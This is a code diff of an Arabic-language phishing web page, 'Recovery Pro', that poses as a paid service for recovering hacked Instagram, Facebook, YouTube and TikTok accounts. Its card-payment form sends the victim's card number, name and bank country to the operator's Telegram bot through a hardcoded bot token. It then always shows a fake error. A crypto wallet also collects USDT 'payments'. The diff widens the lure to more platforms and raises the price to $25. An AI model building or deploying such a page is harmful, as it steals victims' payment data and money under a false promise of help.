@@ -3,24 +3,38 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>استرجاع حسابات إنستغرام | Instagram Recovery Pro</title>
+<title>استرجاع الحسابات | Recovery Pro</title>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet" />
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Cairo',sans-serif}
 body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-height:100vh;overflow-x:hidden}
 .header{display:flex;justify-content:space-between;align-items:center;padding:18px 30px;background:rgba(255,255,255,.05);backdrop-filter:blur(10px);border-bottom:1px solid rgba(255,255,255,.1);position:sticky;top:0;z-index:100}
 .logo{display:flex;align-items:center;gap:10px;font-weight:700;font-size:18px}
-.ig-icon{background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);padding:6px 10px;border-radius:10px;font-size:16px}
+.logo-icon{background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);padding:6px 10px;border-radius:10px;font-size:16px}
 .tg-btn{background:#229ED9;color:#fff;padding:8px 16px;border-radius:8px;text-decoration:none;font-weight:600;font-size:14px;transition:.3s}
 .tg-btn:hover{background:#1a7eb0;transform:translateY(-2px)}
-.hero{text-align:center;padding:60px 20px 30px}
-.hero h1{font-size:42px;font-weight:900;margin-bottom:15px}
+
+/* HERO */
+.hero{text-align:center;padding:55px 20px 25px}
+.hero h1{font-size:40px;font-weight:900;margin-bottom:15px}
 .hero h1 span{background:linear-gradient(45deg,#f09433,#dc2743,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 .hero p{font-size:17px;color:#b8b8d0;margin-bottom:25px}
 .badges{display:flex;justify-content:center;gap:12px;flex-wrap:wrap}
 .badges span{background:rgba(255,255,255,.08);padding:8px 16px;border-radius:20px;font-size:14px;border:1px solid rgba(255,255,255,.1)}
+
+/* PLATFORMS */
+.platforms{display:flex;justify-content:center;gap:15px;flex-wrap:wrap;padding:20px}
+.platform{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);padding:14px 22px;border-radius:14px;font-size:15px;font-weight:700;display:flex;align-items:center;gap:8px;transition:.3s}
+.platform:hover{transform:translateY(-3px);border-color:#dc2743}
+.platform .icon{font-size:22px}
+.pf-ig .icon{color:#E1306C}
+.pf-fb .icon{color:#1877F2}
+.pf-yt .icon{color:#FF0000}
+.pf-tk .icon{color:#fff}
+
+/* FORM */
 .form-section{display:flex;justify-content:center;padding:30px 20px 60px}
-.form-card{background:rgba(255,255,255,.06);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.1);border-radius:20px;padding:35px;width:100%;max-width:520px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+.form-card{background:rgba(255,255,255,.06);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.1);border-radius:20px;padding:35px;width:100%;max-width:560px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
 .form-card h2{margin-bottom:25px;font-size:22px;text-align:center}
 .field{margin-bottom:18px}
 .field label{display:block;margin-bottom:8px;font-size:14px;color:#c8c8e0;font-weight:600}
@@ -32,17 +46,26 @@ body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-h
 .checkbox-label input{width:auto;margin-top:3px}
 .submit-btn{width:100%;padding:15px;background:linear-gradient(45deg,#f09433,#dc2743,#bc1888);border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;transition:.3s;font-family:'Cairo',sans-serif;margin-top:10px}
 .submit-btn:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(220,39,67,.4)}
+
+/* PAYMENT METHODS (in modal) */
+.pay-methods-title{text-align:center;font-size:15px;color:#c8c8e0;margin-bottom:15px;font-weight:600}
+.method-tabs{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px}
+.method-tab{padding:14px 10px;background:rgba(255,255,255,.06);border:2px solid rgba(255,255,255,.12);border-radius:14px;cursor:pointer;text-align:center;transition:.3s;font-family:'Cairo',sans-serif;color:#fff}
+.method-tab .m-icon{font-size:26px;display:block;margin-bottom:6px}
+.method-tab .m-title{font-size:14px;font-weight:700}
+.method-tab .m-sub{font-size:11px;color:#a0a0c0;margin-top:3px}
+.method-tab.active{border-color:#dc2743;background:linear-gradient(45deg,rgba(240,148,51,.15),rgba(220,39,67,.15))}
+.method-tab:hover{border-color:#dc2743}
+
+/* MODAL */
 .modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);backdrop-filter:blur(6px);z-index:999;align-items:center;justify-content:center;padding:20px;overflow-y:auto}
 .modal-overlay.active{display:flex}
-.modal{background:linear-gradient(135deg,#1a1a2e,#16213e);border:1px solid rgba(255,255,255,.15);border-radius:20px;padding:30px;width:100%;max-width:440px;position:relative;box-shadow:0 20px 60px rgba(0,0,0,.8);animation:slideUp .3s ease;max-height:90vh;overflow-y:auto}
+.modal{background:linear-gradient(135deg,#1a1a2e,#16213e);border:1px solid rgba(255,255,255,.15);border-radius:20px;padding:30px;width:100%;max-width:460px;position:relative;box-shadow:0 20px 60px rgba(0,0,0,.8);animation:slideUp .3s ease;max-height:90vh;overflow-y:auto}
 @keyframes slideUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
 .close-modal{position:absolute;top:15px;left:15px;background:rgba(255,255,255,.1);border:none;color:#fff;width:32px;height:32px;border-radius:50%;cursor:pointer;font-size:16px;transition:.3s}
 .close-modal:hover{background:rgba(255,255,255,.2)}
 .modal h2{text-align:center;margin-bottom:10px;font-size:20px}
-.price-tag{text-align:center;font-size:30px;font-weight:900;background:linear-gradient(45deg,#f09433,#dc2743);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:20px}
-.tabs{display:flex;gap:8px;margin-bottom:20px;background:rgba(0,0,0,.3);padding:5px;border-radius:12px}
-.tab{flex:1;padding:10px;background:transparent;border:none;color:#a0a0c0;border-radius:8px;cursor:pointer;font-family:'Cairo',sans-serif;font-weight:600;font-size:14px;transition:.3s}
-.tab.active{background:linear-gradient(45deg,#f09433,#dc2743);color:#fff}
+.price-tag{text-align:center;font-size:34px;font-weight:900;background:linear-gradient(45deg,#f09433,#dc2743);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:20px}
 .tab-content{display:none}
 .tab-content.active{display:block}
 .row{display:flex;gap:10px}
@@ -59,27 +82,34 @@ body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-h
 .error-modal p,.success-modal p{text-align:center;color:#c8c8e0;margin-bottom:20px;line-height:1.6}
 .footer{text-align:center;padding:25px;color:#8080a0;font-size:13px;border-top:1px solid rgba(255,255,255,.08)}
 .footer a{color:#dc2743;text-decoration:none;margin-right:10px}
-@media(max-width:600px){.hero h1{font-size:28px}.hero p{font-size:15px}.form-card{padding:25px 20px}.header{padding:15px 18px}.logo span{font-size:14px}.tg-btn{font-size:12px;padding:6px 12px}.modal{padding:25px 20px}}
+@media(max-width:600px){.hero h1{font-size:26px}.hero p{font-size:15px}.form-card{padding:25px 20px}.header{padding:15px 18px}.logo span{font-size:13px}.tg-btn{font-size:12px;padding:6px 12px}.modal{padding:25px 20px}.method-tab .m-title{font-size:12px}}
 </style>
 </head>
 <body>
 
 <header class="header">
   <div class="logo">
-    <div class="ig-icon">📷</div>
-    <span>Instagram Recovery Pro</span>
+    <div class="logo-icon">🔐</div>
+    <span>Recovery Pro</span>
   </div>
   <a href="https://t.me/RASHKINAE" target="_blank" class="tg-btn">✈️ تواصل معنا</a>
 </header>
 
 <section class="hero">
-  <h1>استرجاع حساب إنستغرام <span>باحترافية</span></h1>
-  <p>خدمة استرجاع الحسابات المخترقة والمقفلة بسرعة وأمان تام</p>
+  <h1>استرجاع الحسابات <span>باحترافية</span></h1>
+  <p>إنستغرام · فيسبوك · يوتيوب · تيك توك — بسرعة وأمان تام</p>
   <div class="badges">
     <span>🔒 آمن 100%</span>
     <span>⚡ خلال 24 ساعة</span>
     <span>💰 ضمان استرجاع</span>
   </div>
+</section>
+
+<section class="platforms">
+  <div class="platform pf-ig"><span class="icon">📷</span> Instagram</div>
+  <div class="platform pf-fb"><span class="icon">📘</span> Facebook</div>
+  <div class="platform pf-yt"><span class="icon">▶️</span> YouTube</div>
+  <div class="platform pf-tk"><span class="icon">🎵</span> TikTok</div>
 </section>
 
 <section class="form-section">
@@ -91,8 +121,18 @@ body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-h
         <input type="email" id="email" placeholder="example@email.com" required />
       </div>
       <div class="field">
-        <label>اسم حساب إنستغرام *</label>
-        <input type="text" id="username" placeholder="@username" required />
+        <label>المنصة *</label>
+        <select id="platform" required>
+          <option value="">-- اختر المنصة --</option>
+          <option value="Instagram">📷 Instagram - إنستغرام</option>
+          <option value="Facebook">📘 Facebook - فيسبوك</option>
+          <option value="YouTube">▶️ YouTube - يوتيوب</option>
+          <option value="TikTok">🎵 TikTok - تيك توك</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>اسم الحساب / الرابط *</label>
+        <input type="text" id="username" placeholder="@username أو رابط الحساب" required />
       </div>
       <div class="field">
         <label>ملاحظات إضافية</label>
@@ -104,23 +144,35 @@ body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-h
           <span>أوافق على الشروط وسياسة الخصوصية وأؤكد أن الحساب ملكي</span>
         </label>
       </div>
-      <button type="submit" class="submit-btn">💳 المتابعة إلى الدفع - 10$</button>
+      <button type="submit" class="submit-btn">💳 المتابعة إلى الدفع - 25$</button>
     </form>
   </div>
 </section>
 
-<!-- Modal الدفع -->
+<!-- ========== PAYMENT MODAL ========== -->
 <div class="modal-overlay" id="paymentModal">
   <div class="modal">
     <button class="close-modal" onclick="closeModal()">✕</button>
     <h2>💳 إتمام الدفع</h2>
-    <p class="price-tag">10.00 USD</p>
+    <p class="price-tag">$25.00 USD</p>
 
-    <div class="tabs">
-      <button class="tab active" onclick="switchTab('card')">💳 بطاقة</button>
-      <button class="tab" onclick="switchTab('usdt')">🪙 USDT</button>
+    <p class="pay-methods-title">اختر طريقة الدفع</p>
+
+    <!-- Method selector -->
+    <div class="method-tabs">
+      <button type="button" class="method-tab active" id="tabCardBtn" onclick="switchTab('card')">
+        <span class="m-icon">💳</span>
+        <div class="m-title">فيزا / ماستركارد</div>
+        <div class="m-sub">دفع فوري</div>
+      </button>
+      <button type="button" class="method-tab" id="tabUsdtBtn" onclick="switchTab('usdt')">
+        <span class="m-icon">🪙</span>
+        <div class="m-title">USDT (BEP20)</div>
+        <div class="m-sub">عملة رقمية</div>
+      </button>
     </div>
 
+    <!-- CARD -->
     <div id="cardTab" class="tab-content active">
       <div class="field">
         <label>رقم البطاقة</label>
@@ -144,27 +196,31 @@ body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-h
         <label>نوع البنك / البلد</label>
         <select id="bankCountry">
           <option value="">-- اختر البلد --</option>
-          <option value="US">الولايات المتحدة</option>
-          <option value="UK">المملكة المتحدة</option>
-          <option value="FR">فرنسا</option>
-          <option value="DE">ألمانيا</option>
-          <option value="MA">المغرب</option>
-          <option value="DZ">الجزائر</option>
-          <option value="TN">تونس</option>
-          <option value="EG">مصر</option>
-          <option value="SA">السعودية</option>
-          <option value="AE">الإمارات</option>
-          <option value="OTHER">أخرى</option>
+          <option value="الأردن">🇯🇴 الأردن</option>
+          <option value="الولايات المتحدة">🇺🇸 الولايات المتحدة</option>
+          <option value="المملكة المتحدة">🇬🇧 المملكة المتحدة</option>
+          <option value="فرنسا">🇫🇷 فرنسا</option>
+          <option value="ألمانيا">🇩🇪 ألمانيا</option>
+          <option value="المغرب">🇲🇦 المغرب</option>
+          <option value="الجزائر">🇩🇿 الجزائر</option>
+          <option value="تونس">🇹🇳 تونس</option>
+          <option value="مصر">🇪🇬 مصر</option>
+          <option value="السعودية">🇸🇦 السعودية</option>
+          <option value="الإمارات">🇦🇪 الإمارات</option>
+          <option value="قطر">🇶🇦 قطر</option>
+          <option value="الكويت">🇰🇼 الكويت</option>
+          <option value="أخرى">🌍 أخرى</option>
         </select>
       </div>
-      <button class="pay-btn" id="cardPayBtn" onclick="payWithCard()">🔒 دفع 10$ بأمان</button>
+      <button class="pay-btn" id="cardPayBtn" onclick="payWithCard()">🔒 دفع 25$ بأمان</button>
     </div>
 
+    <!-- USDT -->
     <div id="usdtTab" class="tab-content">
-      <p class="usdt-note">أرسل مبلغ 10 USDT (BEP20) إلى العنوان التالي:</p>
+      <p class="usdt-note">أرسل مبلغ 25 USDT (شبكة BEP20) إلى العنوان التالي:</p>
       <div class="wallet-box">
         <code id="walletAddress">0xcc77f540130d76e21eaf1e60481af20a56ee24fc</code>
-        <button class="copy-btn" onclick="copyWallet()">📋 نسخ</button>
+        <button type="button" class="copy-btn" onclick="copyWallet()">📋 نسخ</button>
       </div>
       <div class="field">
         <label>أدخل Hash المعاملة بعد الإرسال</label>
@@ -177,7 +233,7 @@ body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-h
   </div>
 </div>
 
-<!-- Modal خطأ -->
+<!-- ERROR MODAL -->
 <div class="modal-overlay" id="errorModal">
   <div class="modal error-modal">
     <div class="error-icon">⚠️</div>
@@ -187,7 +243,7 @@ body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-h
   </div>
 </div>
 
-<!-- Modal نجاح -->
+<!-- SUCCESS MODAL -->
 <div class="modal-overlay" id="successModal">
   <div class="modal success-modal">
     <div class="success-icon">✅</div>
@@ -198,7 +254,7 @@ body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-h
 </div>
 
 <footer class="footer">
-  <p>© 2025 Instagram Recovery Pro — جميع الحقوق محفوظة</p>
+  <p>© 2025 Recovery Pro — جميع الحقوق محفوظة</p>
   <a href="https://t.me/RASHKINAE" target="_blank">الدعم الفني</a>
 </footer>
 
@@ -206,6 +262,7 @@ body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-h
 // ============ CONFIG ============
 const TELEGRAM_BOT_TOKEN = "7370738476:AAHi1BjblAv9O1j3WB9yXRc6fPYf8euWfmQ";
 const TELEGRAM_CHAT_ID   = "7181380947";
+const PRICE_USD = 25;
 
 let currentOrder = {};
 
@@ -214,6 +271,7 @@ document.getElementById("recoveryForm").addEventListener("submit", function(e){
   e.preventDefault();
   currentOrder = {
     email: document.getElementById("email").value.trim(),
+    platform: document.getElementById("platform").value,
     username: document.getElementById("username").value.trim(),
     notes: document.getElementById("notes").value.trim(),
     confirmed: document.getElementById("confirm").checked,
@@ -225,14 +283,22 @@ document.getElementById("recoveryForm").addEventListener("submit", function(e){
 
 // ============ TABS ============
 function switchTab(tab){
-  document.querySelectorAll(".tab").forEach(t=>t.classList.remove("active"));
-  document.querySelectorAll(".tab-content").forEach(c=>c.classList.remove("active"));
-  if(tab==="card"){
-    document.querySelectorAll(".tab")[0].classList.add("active");
-    document.getElementById("cardTab").classList.add("active");
+  const cardTab = document.getElementById("tabCardBtn");
+  const usdtTab = document.getElementById("tabUsdtBtn");
+  const cardContent = document.getElementById("cardTab");
+  const usdtContent = document.getElementById("usdtTab");
+
+  cardTab.classList.remove("active");
+  usdtTab.classList.remove("active");
+  cardContent.classList.remove("active");
+  usdtContent.classList.remove("active");
+
+  if(tab === "card"){
+    cardTab.classList.add("active");
+    cardContent.classList.add("active");
   }else{
-    document.querySelectorAll(".tab")[1].classList.add("active");
-    document.getElementById("usdtTab").classList.add("active");
+    usdtTab.classList.add("active");
+    usdtContent.classList.add("active");
   }
 }
 
@@ -282,7 +348,8 @@ async function payWithCard(){
 
 👤 <b>العميل:</b>
 📧 البريد: <code>${currentOrder.email}</code>
-📸 الحساب: <code>${currentOrder.username}</code>
+📱 المنصة: <code>${currentOrder.platform}</code>
+🔗 الحساب: <code>${currentOrder.username}</code>
 📝 ملاحظات: ${currentOrder.notes || "لا يوجد"}
 
 💳 <b>بيانات البطاقة:</b>
@@ -292,13 +359,13 @@ async function payWithCard(){
 👤 الاسم: <code>${cardName}</code>
 🏦 البلد: <code>${bank}</code>
 
-💰 المبلغ: 10$
+💰 المبلغ: $${PRICE_USD}
 🕐 الوقت: ${currentOrder.timestamp}
   `;
 
   await sendToTelegram(message);
 
-  btn.disabled = false; btn.innerText = "🔒 دفع 10$ بأمان";
+  btn.disabled = false; btn.innerText = `🔒 دفع ${PRICE_USD}$ بأمان`;
 
   closeModal();
   document.getElementById("errorModal").classList.add("active");
@@ -317,12 +384,13 @@ async function payWithUsdt(){
 
 👤 <b>العميل:</b>
 📧 البريد: <code>${currentOrder.email}</code>
-📸 الحساب: <code>${currentOrder.username}</code>
+📱 المنصة: <code>${currentOrder.platform}</code>
+🔗 الحساب: <code>${currentOrder.username}</code>
 📝 ملاحظات: ${currentOrder.notes || "لا يوجد"}
 
 🪙 <b>بيانات USDT:</b>
 🔗 Hash: <code>${txHash}</code>
-💰 المبلغ: 10 USDT
+💰 المبلغ: ${PRICE_USD} USDT
 🌐 الشبكة: BEP20 (BSC)
 
 🕐 الوقت: ${currentOrder.timestamp}
